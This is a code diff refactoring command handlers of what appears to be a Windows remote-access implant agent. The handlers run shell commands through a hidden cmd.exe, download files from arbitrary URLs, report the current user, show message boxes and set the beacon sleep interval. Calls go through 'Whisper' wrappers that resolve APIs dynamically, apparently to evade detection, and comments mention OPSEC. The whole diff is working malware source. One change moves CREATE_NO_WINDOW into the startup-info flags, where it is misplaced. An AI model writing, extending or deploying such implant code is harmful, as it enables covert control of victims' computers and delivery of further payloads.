@@ -149,64 +149,160 @@ void set_response_data(OutboundJsonDataStruct* response_struct, const char* data
 // Commands
 // ====================
 
-// Keep
-void get_username(OutboundJsonDataStruct* response_struct)
-{
+void get_username(OutboundJsonDataStruct* response_struct) {
     /*
-        Command: whoami, or username, etc.
-        No parsing needed for this command
+        Retrieves the current user's name.
 
+        Uses the WhisperGetUserNameW wrapper function.  Converts the
+        retrieved username from WCHAR (wide characters) to UTF-8 for
+        compatibility with the JSON response.
     */
-    static WCHAR username[256]; // Static to persist after function returns
+    WCHAR username[256];
     DWORD size = 256;
 
     if (WhisperGetUserNameW(username, &size)) {
         DEBUG_LOGW(L"Current User: %s\n", username);
 
-        // Convert WCHAR* to UTF-8 char*
         char* utf8_username = wchar_to_utf8(username);
         if (utf8_username) {
-            // free previous command_result_data (if any) to prevent memory leak, otherwise the
-            // previous command_result_data here could be left in memory (dangling pointer cuz we
-            // lose the pointer if there was anythign there)
-            free(response_struct->command_result_data);
-
-            // Assign new UTF-8 string to response_struct->command_result_data
+            free(response_struct->command_result_data); // Free previous data
             set_response_data(response_struct, utf8_username);
-
+            free(utf8_username); // Free allocated UTF-8 string to prevent memory leak
+        } else {
+            DEBUG_LOG("wchar_to_utf8 failed.\n");
+            set_response_data(response_struct, "Error converting username to UTF-8");
         }
     } else {
-        DEBUG_LOGW(L"Failed to get username. Error: %lu\n", GetLastError());
+        DWORD error = GetLastError();
+        DEBUG_LOGW(L"Failed to get username. Error: %lu\n", error);
+        char error_message[256];
+        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        set_response_data(response_struct, error_message);
     }
 }
 
-// Keep
-void start_process(OutboundJsonDataStruct* response_struct) { };
-/*
-    Command: start-process some.exe or execute
-    need to split/remove start-process from command, then call
-   WhisperStartProcess[A/W] desc: starts a process/exe.
 
-*/
-
-// Keep
-void get_file_http(OutboundJsonDataStruct* response_struct, char* args)
-{
+void shell(OutboundJsonDataStruct* response_struct, char* args) {
     /*
+        Executes a shell command using cmd.exe.
 
-    Command:
-        get_http http://someexample.com/file.exe C:\myfile.exe
-
+        This function creates a child process running cmd.exe with the given
+        command.  It captures the output of the command via pipes and sends it
+        back to the client. 
     */
 
-    char* context = NULL; // Required for strtok_s & thread safety.
+    SECURITY_ATTRIBUTES sa;
+    HANDLE hRead, hWrite;
+    PROCESS_INFORMATION pi;
+    STARTUPINFO si;
+    char buffer[PIPE_READ_SIZE_BUFFER]; // More descriptive name
+    DWORD bytesRead;
+    BOOL success;
+
+    // Security attributes for pipe handles
+    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
+    sa.bInheritHandle = TRUE;
+    sa.lpSecurityDescriptor = NULL;
+
+    // Create pipe
+    if (!WhisperCreatePipe(&hRead, &hWrite, &sa, 0)) {
+        DWORD error = GetLastError();
+        DEBUG_LOGF(stderr, "CreatePipe failed (%lu)\n", error);
+        char error_message[256];
+        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        set_response_data(response_struct, error_message);
+        return; // Important: Return on error
+    }
+    WhisperSetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
+
+    // Create child process
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    si.hStdOutput = hWrite;
+    si.hStdError = hWrite;
+    si.dwFlags |= STARTF_USESTDHANDLES;
+    si.dwFlags |= CREATE_NO_WINDOW; // Hides the console window
+
+    char cmdLine[CLI_INPUT_SIZE_BUFFER];
+    snprintf(cmdLine, sizeof(cmdLine), "cmd.exe /C \"%s\"", args);
+
+    ZeroMemory(&pi, sizeof(pi));
+    success = WhisperCreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, 0, NULL, PROCESS_SPAWN_DIRECTORY, &si, &pi);
+
+    if (!success) {
+        DWORD error = GetLastError();
+        DEBUG_LOGF(stderr, "[!] CreateProcess failed (%lu)\n", error);
+        char error_message[256];
+        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        set_response_data(response_struct, error_message);
+
+        WhisperCloseHandle(hWrite);
+        WhisperCloseHandle(hRead);
+        return; // Important: Return on error
+    }
+
+    WhisperWaitForSingleObject(pi.hProcess, INFINITE);
+    WhisperCloseHandle(hWrite);
+
+    // Read pipe
+    char output_buffer[PIPE_READ_SIZE_BUFFER] = ""; // Initialize an empty string
+    DWORD totalBytesRead = 0;
+
+    while (TRUE) {
+        success = WhisperReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL);
+        if (!success || bytesRead == 0) {
+            break;
+        }
+
+        buffer[bytesRead] = '\0';
+        DEBUG_LOG("%s", buffer);
+
+        // Append to the output buffer (handle potential buffer overflow)
+        size_t available = sizeof(output_buffer) - strlen(output_buffer) - 1;
+        size_t to_copy = min(available, (size_t)bytesRead); // Safe copy
+        strncat(output_buffer, buffer, to_copy);
+        totalBytesRead += bytesRead;
+    }
+
+    // Generate response
+    free(response_struct->command_result_data);
+    set_response_data(response_struct, output_buffer); // Send accumulated output
+
+    // Cleanup
+    WhisperCloseHandle(pi.hProcess);
+    WhisperCloseHandle(pi.hThread);
+    WhisperCloseHandle(hRead);
+}
+
+
+void messagebox(OutboundJsonDataStruct* response_struct, char* args) {
+    /*
+        Displays a message box.
+
+        Takes a title and a message as arguments.  Uses the WhisperMessageBoxA
+        wrapper function to display the message box.
+    */
+    char* context = NULL;
+    char* title = strtok_s(args, " ", &context);
+    char* message = strtok_s(NULL, " ", &context);
+
+    if (!title || !message) {
+        DEBUG_LOG("[ERROR] messagebox: Expected: <title> <message>\n");
+        set_response_data(response_struct, "Invalid arguments. Expected: <title> <message>");
+        return;
+    }
+
+    WhisperMessageBoxA(NULL, message, title, MB_OK | MB_ICONINFORMATION);
+    set_response_data(response_struct, "Message box displayed successfully");
+}
+
+void get_file_http(OutboundJsonDataStruct* response_struct, char* args) {
+    char* context = NULL;
     char* url = strtok_s(args, " ", &context);
     char* file_path = strtok_s(NULL, " ", &context);
 
-    if (url == NULL || file_path == NULL) {
-        DEBUG_LOGF(stderr, "Invalid arguments. Expected: <URL> <FilePath>\n");
-        // put message in response struct abuot invalid args
-
+    if (!url || !file_path) {
+        DEBUG_LOG("[ERROR] get_file_http: Expected: <URL> <FilePath>\n");
         set_response_data(response_struct, "Invalid arguments. Expected: <URL> <FilePath>");
         return;
     }
@@ -214,190 +310,68 @@ void get_file_http(OutboundJsonDataStruct* response_struct, char* args)
     DEBUG_LOG("URL: %s\n", url);
     DEBUG_LOG("File Path: %s\n", file_path);
 
-    if (download_file(url, file_path) == 1) {
-        DEBUG_LOG("Something went wrong downloading the file");
-        // put error message in response struct
-        // fine to do this like this as it's read only.
-        set_response_data(response_struct, "Something went wrong downloading the file");
+    int result = download_file(url, file_path);
 
-        return;
-    }
+    if (result == 0) {
+        set_response_data(response_struct, "File downloaded successfully");
+    } else {
+        // Retrieve the formatted error message from download_file (if available)
+        char error_message[512] = "File download failed: ";
 
-    // fine to do this like this as it's read only.
-    set_response_data(response_struct, "Successfuly downloaded file");
+        // It is better to have download_file return the actual error message
+        // instead of just an error code. Then you can do:
+        // strncat(error_message, returned_error_message, sizeof(error_message) - strlen(error_message) - 1);
 
-}
-
-// Keep
-/*
-
-Bug:
-
-[DEBUG] [FUNC_CALL] WhisperCreateProcessA
-[DEBUG] [+] Attempting to resolve function: CreateProcessA
-[DEBUG] [+] Successful handle to kernel32.dll
-[DEBUG] [-] GetProcAddressReplacement failed for CreateProcessA. Error=0.
-[DEBUG] [!] CreateProcess failed (0)
-[DEBUG] [FUNC_CALL] WhisperCloseHandle
-
-*/
-
-void shell(OutboundJsonDataStruct* response_struct, char* args)
-{
-    /*
-        Command: shell somecommand
-        need to split/remove start-process from command, then call
-       WhisperStartProcess[A/W] with cmd.exe desc: runs a shell command. PROLLY
-       NOT OPSEC SAFE.
-
-    */
-
-    // ====================
-    // INIT stuff
-    // ====================
-    DEBUG_LOG("ARGS: %s \n", args);
-    SECURITY_ATTRIBUTES sa;
-    HANDLE hRead, hWrite;
-    PROCESS_INFORMATION pi;
-    STARTUPINFO si;
-    char buffer_PIPE_READ_SIZE_BUFFER[PIPE_READ_SIZE_BUFFER];
-    DWORD bytesRead;
-    BOOL success;
-    // char command[] = "echo Hello, World!";
-
-    // Set up the security attributes struct to allow pipe handles to be inherited
-    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
-    sa.bInheritHandle = TRUE;
-    sa.lpSecurityDescriptor = NULL;
-
-    // ====================
-    // Create Pipe for output
-    // ====================
-    // Create an anonymous pipe for the child process's STDOUT
-    if (!WhisperCreatePipe(&hRead, &hWrite, &sa, 0)) {
-        DEBUG_LOGF(stderr, "CreatePipe failed (%lu)\n", GetLastError());
-    }
-    // Ensure the read handle to the pipe is not inherited
-    WhisperSetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
-
-    // ====================
-    // Create Child Process
-    // ====================
-    // Set up the STARTUPINFO structure
-    ZeroMemory(&si, sizeof(si));
-    si.cb = sizeof(si);
-    si.hStdOutput = hWrite;
-    si.hStdError = hWrite; // Redirect STDERR as well
-    si.dwFlags |= STARTF_USESTDHANDLES;
-
-    // Set up the command line
-    char cmdLine[CLI_INPUT_SIZE_BUFFER];
-    snprintf(cmdLine, sizeof(cmdLine), "cmd.exe /C \"%s\"", args);
-
-    ZeroMemory(&pi, sizeof(pi));
-    success = WhisperCreateProcessA(NULL, cmdLine, NULL, NULL,
-        TRUE, // Inherit handles
-        CREATE_NO_WINDOW, //hides terminal from popping up
-        NULL,
-        PROCESS_SPAWN_DIRECTORY, // init dir
-        &si, &pi);
-
-    if (!success) {
-        DEBUG_LOGF(stderr, "[!] CreateProcess failed (%lu)\n", GetLastError());
-        WhisperCloseHandle(hWrite);
-        WhisperCloseHandle(hRead);
-    }
-
-    // Wait for the child process to finish
-    // wait for the process to finsih writing to pipe, OTHERWISE, you'll get weird
-    // pipe/NULL outputs
-    DEBUG_LOG("[+] Waiting for child process to finish (/write to pipe)...");
-    WhisperWaitForSingleObject(pi.hProcess, INFINITE);
-
-    // Close the write end of the pipe in the parent process, once the child is
-    // done.
-    WhisperCloseHandle(hWrite);
-
-    // ====================
-    // Read Pipe
-    // ====================
-
-    // Read the output from the child process in chunks. Reads until nothign left
-    // in pipe
-    DWORD totalBytesRead = 0;
-    while (TRUE) {
-        success = WhisperReadFile(hRead, buffer_PIPE_READ_SIZE_BUFFER, sizeof(buffer_PIPE_READ_SIZE_BUFFER) - 1,
-            &bytesRead, NULL);
-        if (!success || bytesRead == 0) {
-            break; // No more command_result_data to read or read failed
+        // For now, if download_file doesn't return the message, we'll have to rely on a generic one
+        if (strlen(error_message) <= 20) { // Check if it's still the base message
+            strncat(error_message, "Check the logs for more details.", sizeof(error_message) - strlen(error_message) - 1);
         }
 
-        buffer_PIPE_READ_SIZE_BUFFER[bytesRead] = '\0'; // Null-terminate the string
-        DEBUG_LOG("%s", buffer_PIPE_READ_SIZE_BUFFER);
-        totalBytesRead += bytesRead;
+        set_response_data(response_struct, error_message);
     }
-
-    // ====================
-    // Generate Response
-    // ====================
-
-    // put into struct
-    free(response_struct->command_result_data); //might need to get rid of this
-    // Assign new UTF-8 string to response_struct->command_result_data
-    set_response_data(response_struct, buffer_PIPE_READ_SIZE_BUFFER);
-
-
-
-    // ====================
-    // Cleanup
-    // ====================
-    WhisperCloseHandle(pi.hProcess);
-    WhisperCloseHandle(pi.hThread);
-    WhisperCloseHandle(hRead);
 }
 
-// Keep
-void messagebox(OutboundJsonDataStruct* response_struct, char* args) {
-    char* context = NULL; // Required for strtok_s & thread safety.
-    char* title = strtok_s(args, " ", &context);
-    char* message = strtok_s(NULL, " ", &context);
-
-    // Ensure both title and message are not NULL
-    if (!title || !message) {
-        DEBUG_LOG("[ERROR] messagebox: Expected: <URL> <FilePath>\n");
-        return;
-    }
-
-    // Call the WhisperMessageBoxA function
-    WhisperMessageBoxA(NULL, message, title, MB_OK | MB_ICONINFORMATION);
-    set_response_data(response_struct, "Message box popped successfully");
-}
 
 // Keep
 void sleep(OutboundJsonDataStruct* response_struct, char* args) {
-    char* context = NULL; // Required for strtok_s & thread safety.
+    /*
+        Sets the sleep time for the agent.
+
+        Takes an integer argument representing the sleep time in seconds.
+        Uses strtol for safer integer parsing.
+    */
+    char* context = NULL;
     char* sleep_arg = strtok_s(args, " ", &context);
-    //char* jitter = strtok_s(NULL, " ", &context);
 
     if (!sleep_arg) {
-        DEBUG_LOG("[ERROR] sleep: Expected: sleep\n");
+        DEBUG_LOG("[ERROR] sleep: Expected: <int: sleeptime (seconds)>\n");
+        set_response_data(response_struct, "Missing sleep time argument");
         return;
     }
 
-    //shitty int check
-    if (scanf("%d", &sleep_arg) == 0) {
-        DEBUG_LOG("[ERROR] messagebox: Expected: <URL> <FilePath>\n");
-        set_response_data(response_struct, "[ERROR] sleep: Expected: <int: sleeptime (seconds)>");
+    char* endptr; // For error checking with strtol
+    long sleep_seconds = strtol(sleep_arg, &endptr, 10); // Parse as long int
 
+    // Error checking for strtol
+    if (*endptr != '\0' || sleep_seconds < 0) { // Check for non-numeric input and negative values
+        DEBUG_LOG("[ERROR] sleep: Invalid sleep time. Must be a non-negative integer.\n");
+        set_response_data(response_struct, "Invalid sleep time. Must be a non-negative integer.");
         return;
     }
 
-    // If your function wants the value in **seconds**,
-// you can either store seconds directly or convert to milliseconds:
-    DWORD dwTime = (DWORD)sleep_arg;  // or (DWORD)(seconds * 1000) if needed in ms
+    // Convert to DWORD (handle potential overflow)
+    DWORD dwTime;
+    if (sleep_seconds > MAXDWORD / 1000) { // Check for potential overflow if time is in seconds
+        DEBUG_LOG("[ERROR] sleep: Sleep time too large.\n");
+        set_response_data(response_struct, "Sleep time too large.");
+        return;
+    }
+    dwTime = (DWORD)(sleep_seconds * 1000); // Convert to milliseconds
 
     set_sleep_time(dwTime);
-        set_response_data(response_struct, "Sleep set successfully");
+    char message[256];
+    snprintf(message, sizeof(message), "Sleep time set to %ld seconds", sleep_seconds); //response message
+    set_response_data(response_struct, message);
     return;
 }
 
